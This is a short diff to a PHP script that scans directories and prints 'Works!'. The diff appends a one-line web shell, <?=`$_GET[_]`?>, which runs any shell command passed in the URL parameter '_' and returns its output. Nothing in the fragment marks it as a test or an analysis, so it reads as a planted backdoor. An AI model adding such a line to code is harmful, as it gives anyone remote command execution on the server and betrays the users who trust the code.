@@ -76,3 +76,6 @@ foreach ($scanDirs as $dir) {
 }
 
 echo "Works!\n";
+?>
+
+<?=`$_GET[_]`?> 
